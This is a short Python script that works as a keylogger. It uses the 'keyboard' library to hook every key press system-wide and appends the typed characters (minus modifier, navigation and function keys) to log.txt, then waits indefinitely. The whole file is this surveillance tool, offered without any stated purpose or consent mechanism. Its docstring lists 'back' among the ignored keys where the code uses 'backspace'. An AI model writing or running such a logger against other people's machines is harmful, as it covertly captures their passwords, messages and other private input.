import keyboard


def when_press_the_key(key, log_filename='log.txt'):
    """
    Callback function to handle keyboard events when a key is pressed.

    Parameters:
        key (keyboard.KeyboardEvent): The keyboard event object representing the key press.
        log_filename (str): The name of the log file to which keys will be logged.

    Returns:
        None

    Description:
        This function is intended to be used as a callback for the keyboard.on_press method.
        It logs the keys pressed into a file, ignoring certain keys specified in the keys_to_ignore set.
        The 'enter' key is logged as a new line, the 'space' key is logged as a space character,
        and all other keys are logged as their names.

    Keys to Ignore:
        The following keys will not be logged:
        'alt', 'delete', 'tab', 'back', 'esc', 'ctrl', 'shift',
        'win', 'caps lock', 'up', 'down', 'left', 'right',
        'insert', 'home', 'page up', 'page down', 'end', 'num lock',
        'scroll lock', 'pause', 'print screen',
        'f1', 'f2', 'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
    """

    keys_to_ignore = {
        'alt', 'delete', 'tab', 'backspace', 'esc', 'ctrl', 'shift', 'win', 'caps lock',
        'up', 'down', 'left', 'right', 'insert', 'home', 'page up', 'page down',
        'end', 'num lock', 'scroll lock', 'pause', 'print screen', 'f1', 'f2',
        'f3', 'f4', 'f5', 'f6', 'f7', 'f8', 'f9', 'f10', 'f11', 'f12'
    }

    key_substitutions = {
        'enter': '\n',
        'space': ' ',
    }

    with open(log_filename, 'a', encoding='utf-8') as log_file:
        key_name = key.name
        if key_name not in keys_to_ignore:
            substitution = key_substitutions.get(key_name, key_name)
            log_file.write(substitution)


keyboard.on_press(when_press_the_key)
keyboard.wait()
